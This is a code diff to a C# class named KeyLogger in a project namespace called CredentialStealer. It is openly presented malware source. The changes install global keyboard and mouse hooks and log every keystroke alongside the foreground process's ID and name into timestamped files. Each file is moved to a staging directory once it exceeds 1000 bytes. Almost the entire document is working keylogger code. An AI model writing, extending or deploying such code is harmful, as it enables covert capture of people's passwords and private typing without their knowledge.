@@ -11,9 +11,10 @@ using System.IO;
 
 namespace CredentialStealer.KeyboardRecorder
 {
-    class KeyLogger
+    public class KeyLogger
     {
         private KeyboardHook keyboardHook;
+        private MouseHook mouseHook;
 
         private StreamWriter sw;
 
@@ -22,27 +23,63 @@ namespace CredentialStealer.KeyboardRecorder
         private bool shiftOn;
         private bool capsOn;
 
-        private Dictionary<KeyboardHook.VKeys, char> ConvertKeys = new Dictionary<KeyboardHook.VKeys, char>()
-        {
-            {KeyboardHook.VKeys.SPACE, ' '}
-        };
+        private KeyResolver resolver;
 
-        private List<KeyboardHook.VKeys> IgnoreKeys = new List<KeyboardHook.VKeys>(){ KeyboardHook.VKeys.CONTROL, KeyboardHook.VKeys.LCONTROL, KeyboardHook.VKeys.RCONTROL, KeyboardHook.VKeys.LSHIFT };
+        private string origFileName;
+        private string fileName;
+        private FileInfo file;
+        private string sourceDir;
+        private string destDir;
 
+       
         [DllImport("user32.dll")]
         private static extern IntPtr GetForegroundWindow();
 
         [DllImport("user32.dll")]
         private static extern Int32 GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
 
-        public KeyLogger(string pathToFile)
+        public KeyLogger(string fileName, string sourceDir, string destDir)
         {
-            sw = new StreamWriter(pathToFile);
+            origFileName = fileName;
+            
+            this.fileName = UpdateFileName(origFileName);
+            this.sourceDir = sourceDir;
+            this.destDir = destDir;
+
+            if (!System.IO.Directory.Exists(sourceDir))
+            {
+                System.IO.Directory.CreateDirectory(sourceDir);
+            }
+            
+            if (!System.IO.Directory.Exists(destDir))
+            {
+                System.IO.Directory.CreateDirectory(destDir);
+            }
+
+            this.file = new FileInfo(System.IO.Path.Combine(sourceDir, this.fileName));
+            
+            
 
             keyboardHook = new KeyboardHook();
             keyboardHook.KeyDown += new RamGecTools.KeyboardHook.KeyboardHookCallback(KeyDown);
             keyboardHook.KeyUp += new RamGecTools.KeyboardHook.KeyboardHookCallback(KeyUp);
             keyboardHook.Install();
+
+            mouseHook = new MouseHook();
+            mouseHook.LeftButtonUp += new MouseHook.MouseHookCallback(LeftButtonUp);
+            mouseHook.Install();
+
+            resolver = new KeyResolver();
+        }
+
+        private void LeftButtonUp(MouseHook.MSLLHOOKSTRUCT mouseStruct)
+        {
+            KeyUp(KeyboardHook.VKeys.CLICKMOUSE);
+        }
+
+        public string UpdateFileName(string pathToFile)
+        {
+            return pathToFile + DateTime.Now.ToString("yyyyMMddHHmmssfff");
         }
 
         private static int GetActiveProcessId()
@@ -92,35 +129,66 @@ namespace CredentialStealer.KeyboardRecorder
             }
         }
 
-        private void KeyUp(RamGecTools.KeyboardHook.VKeys key)
+        private bool IsShiftKey(KeyboardHook.VKeys key)
         {
-            //if saved active process is different from current active process,
-            //start a new record of the log
-            int activePid = GetActiveProcessId();
-            if (activePid != storedActivePid)
+            bool shiftOn = false;
+            switch (key)
             {
-                storedActivePid = activePid;
+                case KeyboardHook.VKeys.SHIFT:
+                case KeyboardHook.VKeys.LSHIFT:
+                case KeyboardHook.VKeys.RSHIFT:
+                    shiftOn = true;
+                    break;
+                default:
+                    break;
+            }
+            return shiftOn;
+        }
 
-                //end previous line, add new record to file
-                sw.Write('\n');
-                sw.Write(storedActivePid);
-                sw.Write('\t');
-                sw.Write(GetActiveProcess().ProcessName);
-                sw.Write('\t');
-            }
-            //if saved active process is same as current active process,
-            //continue writing to same line of log
-            if (shiftOn && capsOn)
+        private void KeyUp(KeyboardHook.VKeys key)
+        {
+            using (sw = new StreamWriter((File.Open(System.IO.Path.Combine(sourceDir, fileName), System.IO.FileMode.Append))))
             {
-                sw.Write(key.ToString().ToLower());
-            }
-            else if (shiftOn || capsOn)
-            {
-                sw.Write(key.ToString().ToUpper());
+                //if saved active process is different from current active process,
+                //start a new record of the log
+                int activePid = GetActiveProcessId();
+                if (activePid != storedActivePid)
+                {
+                    storedActivePid = activePid;
+
+                    //end previous line, add new record to file
+                    sw.Write('\n');
+                    sw.Write(storedActivePid);
+                    sw.Write('\t');
+                    sw.Write(GetActiveProcess().ProcessName);
+                    sw.Write('\t');
+                }
+                //if saved active process is same as current active process,
+                //continue writing to same line of log
+            
+                sw.Write(resolver.Resolve(key, shiftOn, capsOn));
+                sw.Flush();
             }
             
-            sw.Flush();
-            shiftOn = false;
+            if (IsShiftKey(key))
+            {
+                shiftOn = false;
+            }
+
+            
+            if (new FileInfo(System.IO.Path.Combine(sourceDir, fileName)).Length > 1000)
+            {
+                CopyFileToOtherDirectory();
+                fileName = UpdateFileName(origFileName);
+            } 
+        }
+
+        private void CopyFileToOtherDirectory()
+        {
+            string sourceFile = System.IO.Path.Combine(sourceDir, fileName);
+            string destFile = System.IO.Path.Combine(destDir, fileName);
+            System.IO.File.Copy(sourceFile, destFile, true);
+            System.IO.File.Delete(sourceFile);
         }
     }
 }
